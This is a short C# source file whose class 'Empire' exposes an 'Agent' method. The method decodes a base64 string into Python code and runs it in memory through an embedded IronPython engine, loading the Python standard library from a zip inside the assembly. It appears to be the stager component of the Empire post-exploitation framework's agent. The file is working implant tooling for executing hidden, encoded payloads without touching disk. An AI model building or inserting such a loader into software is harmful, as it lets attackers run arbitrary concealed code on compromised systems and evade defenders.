using System;
using System.IO.Compression;
using System.IO;
using System.Text;
using IronPython.Hosting;
using IronPython.Modules;
using IronPython.Runtime;
using Microsoft.Scripting;
using Microsoft.Scripting.Hosting;
using System.Collections;
using System.Reflection;
using System.Linq;

namespace CSharpPy
{
    class Empire
    {
        public static void Agent(string B64PyCode)
        {
            // setup ironpython engine
            string PyCode = "";
            byte[] ScriptBytes = Convert.FromBase64String(B64PyCode);
            PyCode = Encoding.ASCII.GetString(ScriptBytes);
            ScriptEngine engine = Python.CreateEngine();

            // Load stdlib to memory
            Assembly asm = Assembly.GetExecutingAssembly();
            dynamic sysScope = engine.GetSysModule();
            var importer = new ResourceMetaPathImporter(asm, "Lib.zip");
            sysScope.meta_path.append(importer);
            sysScope.path.append(importer);

            //execute ironpython code
            var script = engine.CreateScriptSourceFromString(PyCode, SourceCodeKind.Statements);
            script.Execute();
        }
    }
}